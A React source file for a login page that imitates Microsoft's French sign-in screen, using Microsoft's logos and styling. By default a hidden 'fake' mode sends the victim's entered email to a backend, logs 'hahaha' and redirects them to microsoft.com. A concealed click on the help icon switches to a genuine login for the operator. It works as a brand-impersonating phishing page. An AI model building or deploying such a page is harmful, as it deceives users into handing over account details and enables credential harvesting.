import React, { FormEvent, useContext, useState } from 'react'
import { ServiceContext } from '../../context/ServiceContext';
import './Style.css'
import { useNavigate } from 'react-router-dom';

function LoginPage() {
  const navigate = useNavigate();
  const [fetching, setFetching] = useState<boolean>(false);
  const [email, setEmail] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [fake, setFake] = useState<boolean>(true);
  const { authService } = useContext(ServiceContext);

  const submit = (e: FormEvent) => {
    setFetching(true);
    e.preventDefault();
    if(fake) {
      authService.fakeLogin(email).then(data => {
        console.log('hahaha')
        window.location.href = "https://www.microsoft.com/";
      }).catch(err => {
        console.error(err)
        setFetching(false);
      });
    } else {
      authService.login(email, password).then(data => {
        console.log(data)
        sessionStorage.setItem("session", data.token);
        navigate("/");
      }).catch(err => {
        console.error(err)
        setFetching(false);
      });
    }
  }

  return (
    <section className='container'>
      <form className='login-container' onSubmit={submit}>
        <div className='mc-login-container'>
          <div className='row'>
            <img className="mc-logo" src="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" />
          </div>

          <div className='row'>
            <div className='h1'>Connexion</div>
          </div>

          <input type="email" disabled={fetching} value={email} onChange={(e) => setEmail(e.target.value)} className="form-control ltr_override input ext-input text-box ext-text-box" placeholder="E-mail, téléphone ou Skype" required />
          <input type="password" disabled={fetching} value={password} onChange={(e) => setPassword(e.target.value)} className="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Mot de passe" required/>

          <div className="position-buttons password-reset-links-container ext-password-reset-links-container">
            <div className="row">
              <div className="col-md-24">
                <div className="text-13">
                  <div className="form-group">
                    Vous n'avez pas encore de compte&nbsp;?
                    <a href="" id="signup" className='text-blue'>
                      Créez-en un&nbsp;!
                    </a>
                  </div>

                  <div className="form-group text-blue">
                    <a href="#">Se connecter avec Windows Hello ou une clé de sécurité</a>
                    <span className="help-button" >
                      <img onClick={() => setFake(!fake)} role="presentation" src="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" />
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
            <div className="inline-block button-item ext-button-item">
              <input disabled={fetching} type="submit" id="idSIButton9" className="win-button button_primary button ext-button primary ext-primary" value="Connexion"/>
            </div>
          </div>
        </div>

        <div className='other-login-container'>
          <img className="logo" src="https://logincdn.msftauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" />
          <div>Options de connexion</div>
        </div>
      </form>
    </section>
  )
}

export default LoginPage;
